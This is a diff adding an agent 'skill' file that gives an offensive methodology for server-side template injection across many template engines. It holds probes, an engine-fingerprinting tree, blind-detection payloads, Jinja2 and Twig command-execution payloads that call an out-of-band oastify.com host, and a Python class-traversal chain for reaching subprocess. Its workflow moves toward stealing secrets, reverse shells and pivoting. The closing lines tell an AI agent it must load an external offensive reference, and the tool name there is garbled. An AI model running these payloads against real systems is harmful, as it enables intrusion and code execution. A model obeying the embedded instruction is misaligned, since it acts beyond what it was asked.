@@ -1,0 +1,131 @@
+---
+name: offensive-ssti
+description: "Dense description covering Server-Side Template Injection across Jinja2, Twig, Freemarker, Velocity, Pebble, Smarty, Mako, Handlebars, ERB, Thymeleaf, EJS, Pug. Engine fingerprinting, filter bypass, blind exploitation, WAF evasion, SSTI-to-RCE chains. Tools: tplmap. CWE-1336. MITRE T1190. Use when testing template rendering endpoints or exploiting template injection for code execution."
+---
+
+# Server-Side Template Injection (SSTI) -- Offensive Methodology
+
+SSTI exists wherever user-controlled input is concatenated into a server-side
+template string and the engine evaluates it as code. The engine executes
+attacker-supplied directives, granting access to the language runtime and, in
+nearly every engine, remote code execution through the host language's object
+model. You encounter SSTI in any application passing raw user input to functions
+like `render_template_string()`, `Template()`, or `compile()`.
+
+CWE-1336. MITRE ATT&CK T1190.
+
+## Quick Workflow
+
+1. Map injection surfaces: URL params, POST bodies, JSON values, path segments, headers, cookies.
+2. Inject polyglot probes and engine-specific arithmetic expressions; note evaluation, errors, or blank output.
+3. Fingerprint the engine via decision-tree probes, error signatures, and variable enumeration (section 1).
+4. Confirm server-side execution -- rule out client-side template injection (AngularJS, Vue.js).
+5. Escalate to information disclosure: dump config, env vars, secrets, internal paths.
+6. Achieve code execution with the engine-specific chain; apply bypass techniques if blocked (section 6).
+7. Chain for higher impact: file read, SSRF to cloud metadata, reverse shell, internal pivot.
+8. Produce non-destructive PoC with unique marker and capture the full request/response chain.
+
+---
+
+## 1. Engine Detection and Fingerprinting
+
+### 1.1 Polyglot Probes
+
+```text
+${{<%[%'"}}%\          Universal polyglot
+{{7*7}}                Double-curly arithmetic
+{{7*'7'}}              String multiplication (Jinja2 returns 7777777, Twig returns 49)
+<%= 7*7 %>             ERB / EJS style
+#{7*7}                 Pebble / Pug / Thymeleaf contexts
+@(7+7)                 Razor (.NET)
+```
+
+Engine-narrowing probes:
+
+```text
+{{config}}             Jinja2/Flask config dict
+{{_self.env}}          Twig Environment object
+{$smarty.version}      Smarty version string
+<#assign x=1>          Freemarker (then reference x in dollar-curly)
+```
+
+For Velocity, inject `#set( $x = 7 * 7 )` then reference `$x`.
+For Thymeleaf/SpEL, inject a dollar-curly expression with `T(java.lang.Math).PI`.
+For Mako, inject a dollar-curly expression with `self.module.__name__`.
+
+### 1.2 Decision Tree
+
+```text
+{{7*7}} --> 49?
+  YES --> {{7*'7'}} --> "7777777"? --> Jinja2/Nunjucks ({{config}} narrows to Flask)
+                    --> "49"?      --> Twig
+                    --> error?     --> Handlebars
+  NO  --> dollar-curly with 7*7 --> 49?
+            YES --> dollar-curly with class ref   --> Velocity
+                    dollar-curly with T(Math).PI  --> Thymeleaf
+                    <#assign x=1> then ref x      --> Freemarker
+                    error contains "mako"         --> Mako
+            NO  --> <%= 7*7 %> --> 49?
+                      error with "erb"/"Erubi"    --> ERB
+                      error with "ejs"            --> EJS
+                    @(7+7) --> 14?                --> Razor
+```
+
+### 1.3 Error Signatures
+
+| Signature                                        | Engine     |
+|--------------------------------------------------|------------|
+| `jinja2.exceptions.UndefinedError`               | Jinja2     |
+| `Twig\Error\SyntaxError`                         | Twig       |
+| `freemarker.core.ParseException`                 | Freemarker |
+| `org.apache.velocity.exception`                  | Velocity   |
+| `com.mitchellbosecke.pebble.error`               | Pebble     |
+| `SmartyCompilerException`                        | Smarty     |
+| `mako.exceptions.SyntaxException`                | Mako       |
+| `Parse error` with Handlebars context            | Handlebars |
+| `SyntaxError` with ERB path                      | ERB        |
+| `org.thymeleaf.exceptions.TemplateProcessing`    | Thymeleaf  |
+| `SyntaxError` with `.ejs` path                   | EJS        |
+| `Pug:Error`                                      | Pug        |
+
+### 1.4 Blind Detection
+
+**Time-based:** `{{range(99999999)|join}}` (Jinja2), `<%= sleep(5) %>` (ERB).
+For Java engines, inject a dollar-curly with `T(java.lang.Thread).sleep(5000)`.
+
+**OOB DNS:** Use Burp Collaborator or interactsh. Jinja2:
+`{{self.__init__.__globals__.__builtins__.__import__('os').popen('nslookup UNIQUE.oastify.com').read()}}`.
+Twig: `{{['nslookup UNIQUE.oastify.com']|map('system')}}`.
+
+**Error inference:** Compare `{{7*7}}` vs `{{7*'INVALID}}` -- different response
+behavior confirms processing.
+
+---
+
+## 2. Jinja2 / Python
+
+Exploitation relies on MRO traversal to `object`, subclass enumeration, and
+`__globals__`/`__builtins__` access.
+
+### 2.1 MRO Traversal and Subclass Enumeration
+
+```python
+{{''.__class__.__mro__[1]}}                    # Reach object base class
+{{''.__class__.__mro__[1].__subclasses__()}}   # List all subclasses
+
+# Find subprocess.Popen index (varies by Python version -- never hardcode)
+{% for cls in ''.__class__.__mro__[1].__subclasses__() %}
+  {% if 'Popen' in cls.__name__ %}{{ loop.index0 }}{% endif %}
+{% endfor %}
+```
+
+
+---
+
+## 📚 Deep Reference (Progressive Disclosure)
+
+> ⚠️ **CONTEXT OPTIMIZATION:** The detailed methodology, edge cases, attack vectors, and advanced configurations for this skill are stored externally to save tokens.
+
+To access the full technical reference, you MUST use your iew_file tool to read:
+
+d:\xampp\htdocs\0-fonte\.agent\skills\claude-red-offensive-ssti\references\reference.md
